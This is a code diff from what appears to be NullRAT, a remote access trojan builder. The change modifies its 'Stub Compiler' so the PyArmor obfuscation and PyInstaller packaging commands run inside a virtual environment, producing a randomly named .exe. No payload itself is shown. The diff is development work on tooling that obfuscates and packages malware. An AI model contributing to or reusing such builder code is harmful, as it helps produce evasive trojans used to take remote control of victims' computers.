@@ -5,15 +5,15 @@ import std/random
 import std/envvars
 import std/[strutils, strformat]
 
-from utils import cleanWorkingDir, printName
+from utils import cleanWorkingDir, printName, runInVenv
 
 proc compiler*(): int = 
     printName()
     var appDirectory = getAppDir()
     setCurrentDir(appDirectory / "NullRAT")
     
+    let venvPath = appDirectory / "NullRAT" / "NR_VENV"
     stdout.styledWriteLine({styleBright}, "  >> Stub Compiler <<")
-    echo getEnv("PATH") # DEBUG
 
     echo ""
     var obfuscate: bool
@@ -153,10 +153,10 @@ proc compiler*(): int =
         discard execShellCmd("color C")
         if obfuscate: 
             echo pyarmor_cmd
-            discard execShellCmd(pyarmor_cmd)
+            discard runInVenv(venvPath, pyarmor_cmd)
         else: 
             echo pyinst_cmd
-            discard execShellCmd(pyinst_cmd)
+            discard runInVenv(venvPath, pyinst_cmd)
         
         var name = $rand(6969) & ".exe"
         if fileExists(currentDirectory / "dist" / obFileName):
